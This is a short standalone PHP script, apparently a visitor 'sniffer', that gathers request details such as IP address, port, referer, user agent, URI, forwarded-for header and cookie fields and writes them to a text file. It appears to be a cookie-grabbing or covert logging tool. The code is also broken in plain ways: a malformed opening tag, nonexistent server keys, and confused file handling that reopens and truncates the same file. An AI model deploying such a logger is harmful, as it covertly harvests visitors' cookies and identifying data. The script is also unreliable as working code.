<? php
 $snif[]= $_SERVER['HTTP_ACCEPT_CHARSET'];
 $snif[]= $_SERVER['$HTTP_ACCEPT_LANGUAGE'];
 $snif[]= $_SERVER['HTTP_CONNECTION'];
 $snif[]= $_SERVER['HTTP_HOST'];
 $snif[]= $_SERVER['HTTP_REFERER'];
 $snif[]= $_SERVER['HTTP_USER_AGENT'];
 $snif[]= $_SERVER['REMOTE_ADDR'];
 $snif[]=$_SERVER['REMOTE_HOST'];
 $snif[]=$_SERVER['REMOTE_PORT'];
 $snif[]=$_SERVER['REQUEST_URI'];
 $snif[]= $_SERVER['HTTP_COOKIE_VARS']; 
 $snif[]= $_SERVER['COOKIE'];
 $snif[]= $_SERVER['HTTP_X_FORWARDED_FOR'];

$file = "file.txt"; 
$s = fopen($file,"a+");
$sa = fread ($s,filesize($file));
$fp = fopen($file,"w");
foreach ($snif as $sniffed)
{
fwrite($fp,"\n".$sniffed);
}
fwrite($fp,"\n");
fwrite($s,$sa);
fclose($s);
fclose($fp);
 
 ?>
